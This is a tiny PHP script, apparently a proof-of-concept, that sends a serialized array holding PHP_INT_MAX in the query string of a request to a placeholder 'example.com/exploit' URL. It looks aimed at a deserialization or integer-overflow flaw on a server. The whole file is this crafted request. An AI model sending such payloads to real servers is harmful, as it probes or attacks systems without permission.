<?php
$url = 'https://example.com/exploit';
$url.= '?'. urlencode(serialize(array('value' => PHP_INT_MAX)));
file_get_contents($url);

?>